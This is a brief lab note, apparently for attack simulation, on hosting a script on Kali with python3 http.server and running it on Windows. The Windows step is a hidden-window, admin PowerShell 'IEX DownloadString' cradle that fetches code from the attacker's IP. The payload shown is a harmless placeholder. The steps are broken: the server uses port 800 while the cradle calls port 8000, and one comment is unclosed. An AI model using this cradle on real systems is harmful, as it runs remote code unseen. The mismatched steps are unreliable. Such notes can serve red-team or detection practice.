Host a fake script on Kali 
then follow below steps
<!--run below commans in kali terminal-->
echo 'Write-Output "Simulated payload executed"' > script.ps1
python3 -m http.server 800

<!--run below commands in powershell as admin>
powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<your-kali-ip>:8000/script.ps1')
